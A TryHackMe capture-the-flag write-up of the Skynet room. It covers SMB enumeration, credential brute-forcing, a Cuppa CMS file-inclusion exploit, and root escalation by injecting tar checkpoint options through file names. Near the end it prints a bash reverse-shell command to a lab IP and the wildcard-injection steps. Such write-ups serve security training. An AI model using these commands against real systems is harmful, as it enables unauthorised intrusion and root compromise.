Here I'm sharing how i attacked the Skynet machine on TryHackMe.

![skynetbanner](https://user-images.githubusercontent.com/64267672/131548745-7e469214-c9f4-495e-9e18-036abe01748b.png)


Starting with an Nmap scan;
![skynetnmap](https://user-images.githubusercontent.com/64267672/131534547-948ef292-5386-4865-88d1-f21cecf6a2c5.png)


Taking a look at port 80;
![skynetweb](https://user-images.githubusercontent.com/64267672/131535132-4b79e27f-47d7-456a-8c73-2d4ef12ebc8a.png)


Now bruteforcing directories;
![skynetdir](https://user-images.githubusercontent.com/64267672/131537119-0e36a97e-bb47-44cf-82db-42bebd221aab.png)


We find a login page upon visiting  /squirrelmail
![skynetsnquilelmail](https://user-images.githubusercontent.com/64267672/131537439-932cf147-df39-4a19-99bf-53adf86422cb.png)

Going back to the nmap scan results so i started digging frrom port 445 (smb)
![skynetsmbclient](https://user-images.githubusercontent.com/64267672/131537902-15877751-3b3c-4430-9a07-6fa5c6c18fd9.png)


we can download the juicy files from smb to our local machine, 
Now reading attention.txt exposes potential username & log1.txt has a list of potential passwords mmmm;

![skynetpotential](https://user-images.githubusercontent.com/64267672/131538383-2a9c392f-99ed-42bb-8701-ed0e6a03f1fb.png)


Now bruteforcing with burpsuite intruder & we have valid creds
![skynetpasssmb](https://user-images.githubusercontent.com/64267672/131538658-9fa9b54c-6b15-4f9a-90f4-964e438c2014.png)

we can go back to the login page on port 80 & login with the valid creds we've found

Looks like we have access to the email account & we can find just 3 email conversations
Reading one from skynet@skynet reveals some info

![skynetemail](https://user-images.githubusercontent.com/64267672/131539491-cc7ea41c-c046-4a39-a103-6388e161b3f0.png)

That's a password to "milesdyson" smb share & with that we get access to some other files

![skynetmilesdysonshare](https://user-images.githubusercontent.com/64267672/131539944-8b2bd4d2-fe22-43b4-b692-6ed45e8e57af.png)


we get & read the important.txt on his notes folder on smb which exposes a new directory;

![skynetimportant](https://user-images.githubusercontent.com/64267672/131540228-0bba366b-2ed4-40c7-a721-f137ce3c0fe8.png)

This is his personal page;

![skynetpersdir](https://user-images.githubusercontent.com/64267672/131540746-bfb1215e-def2-48a5-ad5b-a61f2e20d32e.png)

sadly we find nothing there so we have to do a directory bursting & found /administrator;

![skynetadmin](https://user-images.githubusercontent.com/64267672/131542783-3c388fbe-0086-4645-8d91-80c5d2225e9b.png)

We see it's running cupa cms. Now looking at google & we see some remote file inclusion vulnurability linked to cupa
reading on the vulnurability/exploit on exploit db & we can have an idia how to exploit;
Reading /etc/passwd 

![skynetetcpasswd](https://user-images.githubusercontent.com/64267672/131544006-9fa7c52e-0366-4a74-ae0f-e36856a41ca0.png)

We can try to inlude a reverse shell & use it to get shell access on web server.

![skynetwebshell](https://user-images.githubusercontent.com/64267672/131544693-f94c7949-b2f8-4160-8d13-21f59718fdbf.png)

Now we have shell & can read our user.txt in /home/milesdyson directory

![skynetuser](https://user-images.githubusercontent.com/64267672/131545024-3bd3b5ea-2f53-41ce-ba07-3d69a8d3e531.png)


Now we can go elevate our privilege to Root.

Looking at the /backups folder & we can read a backup.sh script

This compresses the entire /var/www/html directory with tar and saves the archive to miles’ home directory. The script is executed by root every minute:

Now creating a privileged reverse shell;


tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.50.72/6666 0>&1' > /var/www/html/shell
$ chmod +x /var/www/html/shell
$ touch /var/www/html/--checkpoint=1
$ touch /var/www/html/--checkpoint-action=exec=bash\ shell
$ ./shell

![skynetuserbinbash](https://user-images.githubusercontent.com/64267672/131547330-7b682fda-2878-495c-86b9-a656fab4a295.png)


And we have root shell from listening on the revserse shell port & we can read root.txt;

![skynetrootshell](https://user-images.githubusercontent.com/64267672/131547713-2bf466c6-51d0-4b49-8a69-16aad2a0f7cc.png)


### REFRENCES

https://tryhackme.com/room/skynet

https://gtfobins.github.io/gtfobins/tar/

https://www.exploit-db.com/exploits/25971



